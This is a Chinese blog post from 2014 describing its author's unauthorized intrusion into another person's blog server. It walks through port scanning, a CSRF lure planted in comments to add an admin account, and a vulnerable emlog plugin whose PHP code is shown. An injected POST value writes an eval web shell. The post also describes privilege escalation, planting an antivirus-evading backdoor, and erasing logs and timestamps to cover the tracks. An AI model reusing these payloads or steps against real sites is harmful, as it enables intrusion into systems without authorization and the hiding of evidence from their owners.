@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="robots" content="index,follow" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="author" content="Chu" />
+    <meta name="description" content="Chu 的博客" />
+    <meta name="keywords" content="Chu,网络安全,编程开发" />
+
+    <title>某黑客站 - Chu&#39;s BLoG</title>
+
+    
+    
+    
+    <link rel="stylesheet" href="/css/main.ee4a618df935f0a2b9d9e99663fcbefb3605c141a5835bb785b399615d5fac1e.css" integrity="sha256-7kphjfk18KK52emWY/y&#43;&#43;zYFwUGlg1u3hbOZYV1frB4=" />
+    <link rel="alternate" href="/index.xml" type="application/atom+xml" title="RSS" />
+  </head>
+
+  <body>
+    <header></header>
+    <main>
+<article>
+    <header>
+        <h1>某黑客站</h1>
+        <div>
+            <time datetime="2014-03-26 20:51:01 +0800 CST">发布时间: 2014-03-26 20:51</time>
+            <time datetime="2014-03-26 20:51:01 +0800 CST">更新时间: 2014-03-26 20:51</time>
+        </div>
+    </header>
+
+    <section>
+    <p>对某黑客博客的一次测试，记录下。</p>
+<h2 id="信息收集">信息收集</h2>
+<p>独立 VPS，无 CDN，IP：8.8.8.8，Windows 2003 操作系统。nmap 扫描端口，发现开放80，135，999，1025，1026，3306，3309端口。</p>
+<table>
+  <thead>
+      <tr>
+          <th>端口</th>
+          <th>信息</th>
+          <th>利用</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>80</td>
+          <td>IIS 6, emlog</td>
+          <td>脚本入侵，利用 emlog 漏洞</td>
+      </tr>
+      <tr>
+          <td>135</td>
+          <td>MSRPC</td>
+          <td></td>
+      </tr>
+      <tr>
+          <td>999</td>
+          <td>IIS</td>
+          <td></td>
+      </tr>
+      <tr>
+          <td>1025</td>
+          <td>MSRPC</td>
+          <td></td>
+      </tr>
+      <tr>
+          <td>1025</td>
+          <td>MSRPC</td>
+          <td></td>
+      </tr>
+      <tr>
+          <td>3306</td>
+          <td>MySQL，无法外连</td>
+          <td>提权时可考虑</td>
+      </tr>
+      <tr>
+          <td>3389</td>
+          <td>MS-WBT-SERVER</td>
+          <td>暴力破解3389 密码</td>
+      </tr>
+  </tbody>
+</table>
+<h2 id="漏洞挖掘">漏洞挖掘</h2>
+<p>从 web 入手，emlog 博客程序后台添加管理处无 token 认证，即存在 CSRF 漏洞。当服务器支持 zip 解压时，后台可通过上传插件活主题 getshell；服务器不支持 zip 解压时，可以考虑审计插件 getshell。</p>
+<h2 id="漏洞利用">漏洞利用</h2>
+<p>利用 Phithon 编写的 emlog exp。编写 CSRF 页面，传到肉鸡服务器上，通过评论插入链接诱使黑客访问。</p>
+<p>数日后，黑客登录后台，访问链接成功添加管理。</p>
+<p>利用新添加的管理登录后台，试图通过上传主题 getshell，却发现服务器不支持 zip 解压，于是改变方向对插件进行审计。博客安装了个邮件通知插件，审计挖掘到一枚文件写入漏洞:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">plugin_setting</span>(){
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">require</span> (<span style="color:#a6e22e">EMLOG_ROOT</span> <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;/content/plugins/commentNotice/commentNotice_config.php&#39;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">foreach</span> (<span style="color:#a6e22e">explode</span>(<span style="color:#e6db74">&#34;,&#34;</span>,$_POST[<span style="color:#e6db74">&#39;exclude&#39;</span>]) <span style="color:#66d9ef">as</span> $exclude){
+</span></span><span style="display:flex;"><span>                $excludes <span style="color:#f92672">=</span> $excludes<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;&#34;&#39;</span><span style="color:#f92672">.</span>$exclude<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;&#34;&#39;</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#34;,&#34;</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        $excludes<span style="color:#f92672">=</span><span style="color:#a6e22e">rtrim</span>($excludes, <span style="color:#e6db74">&#34;,&#34;</span>);
+</span></span><span style="display:flex;"><span>        $newConfig <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39; &#34;&#39;</span><span style="color:#f92672">.</span>$_POST[<span style="color:#e6db74">&#34;host&#34;</span>]<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;&#34;, //smtp服务器
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &#34;smtpUser&#34; =&gt; &#34;&#39;</span><span style="color:#f92672">.</span>$_POST[<span style="color:#e6db74">&#34;user&#34;</span>]<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;&#34;, //发件邮箱
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &#34;smtpPwd&#34; =&gt; &#34;&#39;</span><span style="color:#f92672">.</span>$_POST[<span style="color:#e6db74">&#34;pwd&#34;</span>]<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;&#34;, //发信邮箱密码
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &#34;rule&#34; =&gt; &#34;&#39;</span><span style="color:#f92672">.</span>$_POST[<span style="color:#e6db74">&#34;rule&#34;</span>]<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;&#34;, //0为所有人，1为仅自己
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &#34;exclude&#34; =&gt; array(
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                &#39;</span><span style="color:#f92672">.</span>$excludes<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        )
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">);?&gt;&#39;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">@</span><span style="color:#a6e22e">file_put_contents</span>(<span style="color:#a6e22e">EMLOG_ROOT</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#39;/content/plugins/commentNotice/commentNotice_config.php&#39;</span>, $newConfig);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>对 POST 参数未做任何过滤就写入到本地配置文件中，于是构造:</p>
+<pre tabindex="0"><code>$_POST[&#34;host&#34;] =&gt; &#34;);@eval($_POST[&#39;xxoo&#39;]);?&gt;
+</code></pre><p>成功写入文件，getshell。</p>
+<h2 id="权限提升">权限提升</h2>
+<p>Windows 2003，支持 aspx，可以执行命令。查看系统信息，发现补丁打的很全，MYSQL 被降权，多余的第三方软件也没有，一时陷入僵局。</p>
+<p>一段时间后，不知什么原因，黑客更换了服务器，重新查看信息后发现补丁都没有打了，尝试 pr 提权，报错：找不到 wmi 进程，其他的 exp 也都失败。扔给音符牛，还是用 pr 提下了，应该是期间黑客重启 IIS 了。</p>
+<h2 id="后门--日志清理">后门 &amp; 日志清理</h2>
+<p>网站写入免杀马，删除相关日志，将修改过的文件都恢复至原样，文件时间修改至与其他文件时间一致。</p>
+<h2 id="经验总结">经验总结</h2>
+<ul>
+<li>PR 找不到 WMI：http://www.91ri.org/7010.html</li>
+<li>经验很重要！</li>
+</ul>
+<p>感谢 @音符牛。</p>
+
+    </section>
+</article>
+</main>
+  </body>
+</html>
